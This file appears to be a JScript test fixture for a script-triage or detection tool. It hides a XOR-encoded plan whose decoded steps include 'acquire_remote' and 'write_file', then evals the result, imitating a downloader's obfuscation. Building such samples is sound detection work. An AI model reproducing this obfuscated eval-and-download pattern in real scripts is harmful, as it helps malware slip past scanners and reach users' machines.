// Huntress Script Triage -- inert static-analysis fixture (wsh_jscript_windows)
function decode_b5b12533(SoUrCeByTeS) {
  var DeCoDeDByTeS = [];
  var previous = 1;
  for (var i = 0; i < SoUrCeByTeS.length; i++) { DeCoDeDByTeS.push(SoUrCeByTeS[i] ^ previous); previous = SoUrCeByTeS[i]; }
  return DeCoDeDByTeS;
}
function recover_eb2c4398() {
  if (true) {
    var characters = [122,88,43,95,58,74,57,27,33,122,88,57,90,43,94,55,69,32,127,13,104,5,106,30,123,89,117,87,32,82,59,79,42,117,19,122,22,115,81,12,32,2,99,7,102,22,98,7,117,87,109,79,2,107,8,122,21,102,9,111,27,53,109,32,108,36,112,36,116,86,122,88,46,79,35,86,51,64,98,88,35,1,98,3,110,30,127,22,113,31,64,41,77,111,85,119,20,117,24,104,9,96,7,105,68,34,27,44,29,47,31,123,67,122,30,60,16,50,71,53,89,123,65,99,11,127,11,123,8,50,29,50,84,109,90,107,89,105,13,53,12,104,70,35,91,58,87,39,75,46,0,105,7,113,16,124,21,113,94,63,13,105,91,57,9,104,95,113,21,116,0,34,14,44,89,42,79,61,98,3,100,1,111,27,57,3,33,105,28,114,6,116,17,98,17,93,60,94,113,23,46,25,40,26,42,78,118,79,43,9,37,7,97,8,100,1,94,46,79,59,83,113,75,105,42,16,76,16,69,54,83,33,82,14,82,2,119,21,121,16,115,47,115,59,78,32,84,38,67,48,67,15,110,12,80,12,127,11,106,13,104,69,35,26,45,28,46,30,122,66,123,31,49,85,52,64,98,31,51,17,98,22,119,16,117,54,89,44,66,54,20,46,28,97];
    var SoUrCeByTeS = [];
    for (var ci = 0; ci < characters.length; ci++) { SoUrCeByTeS.push(characters[ci]); }

    var DeCoDeDByTeS = [];
    try { DeCoDeDByTeS = decode_b5b12533.apply(null, [SoUrCeByTeS]); } catch (ignored) { DeCoDeDByTeS = []; }
    var DeScRiPtOrTeXt = "";
    for (var bi = 0; bi < DeCoDeDByTeS.length; bi++) { DeScRiPtOrTeXt += String.fromCharCode(DeCoDeDByTeS[bi]); }
    return DeScRiPtOrTeXt;
  }
}
function inspect_b717a76c() {
  var DeScRiPtOr = eval("(" + recover_eb2c4398.apply(null, []) + ")");
  var PlAn = new Object();
  PlAn.steps = DeScRiPtOr.steps;
  PlAn["adapter"] = DeScRiPtOr["adapter"];
  PlAn.values = DeScRiPtOr.values;
  PlAn["stageCount"] = DeScRiPtOr["stageCount"];
  return PlAn;
}
